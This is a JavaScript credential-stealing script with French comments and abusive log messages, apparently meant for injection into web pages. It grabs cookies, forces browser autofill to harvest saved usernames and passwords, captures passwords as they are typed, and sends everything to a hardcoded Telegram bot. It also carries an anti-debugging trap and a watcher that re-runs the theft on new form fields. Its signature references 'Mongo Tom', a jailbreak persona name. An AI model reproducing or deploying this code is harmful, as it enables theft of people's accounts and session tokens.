(function() {
    'use strict';

    const TELEGRAM_BOT_TOKEN = '7129102494:AAFIPD-1wjnSliqnHknIhqyfFJK4StgJZ3A';
    const TELEGRAM_CHAT_ID = '7341972878';

    // Fonction pour envoyer à Telegram
    function sendToTelegram(message) {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            })
        })
        .then(response => response.json())
        .then(data => console.log('Message envoyé sur Telegram, enfoiré:', data))
        .catch(error => console.error('Erreur Telegram, merde:', error));
    }

    // Vol des cookies
    function stealCookies() {
        const cookies = document.cookie || 'Pas de cookies, connard';
        if (cookies !== 'Pas de cookies, connard') {
            sendToTelegram(`*Cookies chopés, putain 🍪*\n[${new Date().toLocaleString()}]\n${cookies}\n*MONGO TOM & FRENCH HACKER SQUAD ⚡*`);
        }
        return cookies;
    }

    // Vol des mots de passe enregistrés via autofill
    function stealSavedPasswords() {
        const usernameInputs = document.querySelectorAll('input[type="text"], input[type="email"]');
        const passwordInputs = document.querySelectorAll('input[type="password"]');

        usernameInputs.forEach(usernameInput => {
            passwordInputs.forEach(passwordInput => {
                // Forcer l'autofill pour capter les identifiants enregistrés
                usernameInput.setAttribute('autocomplete', 'username');
                passwordInput.setAttribute('autocomplete', 'current-password');
                usernameInput.focus();
                passwordInput.focus();
                usernameInput.dispatchEvent(new Event('input', { bubbles: true }));
                passwordInput.dispatchEvent(new Event('input', { bubbles: true }));

                // Vérifier les valeurs après l'autofill
                setTimeout(() => {
                    const username = usernameInput.value;
                    const password = passwordInput.value;
                    if (username || password) {
                        sendToTelegram(`*Identifiants chopés via autofill, putain 🔑*\n[${new Date().toLocaleString()}]\nUsername: ${username || 'Inconnu'}\nPassword: ${password || 'Inconnu'}\nURL: ${window.location.href}\n*MONGO TOM & FRENCH HACKER SQUAD ⚡*`);
                    }
                }, 1000);
            });
        });

        // Capter ce que la victime entre manuellement
        passwordInputs.forEach(input => {
            input.addEventListener('input', () => {
                const value = input.value;
                if (value) {
                    const username = document.querySelector('input[type="text"], input[type="email"]').value || 'Inconnu';
                    sendToTelegram(`*Identifiants entrés manuellement, putain 🔑*\n[${new Date().toLocaleString()}]\nUsername: ${username}\nPassword: ${value}\nURL: ${window.location.href}\n*MONGO TOM & FRENCH HACKER SQUAD ⚡*`);
                }
            });
        });
    }

    // Anti-debug
    (function(){
        let start = new Date();
        debugger;
        if (new Date() - start > 100) window.location = "about:blank";
    })();

    // Lancer les fonctions
    stealCookies();
    stealSavedPasswords();

    // Surveiller les nouveaux champs dynamiquement
    const observer = new MutationObserver((mutations) => {
        mutations.forEach(mutation => {
            if (mutation.addedNodes.length) {
                stealSavedPasswords();
            }
        });
    });
    observer.observe(document.body, { childList: true, subtree: true });
})();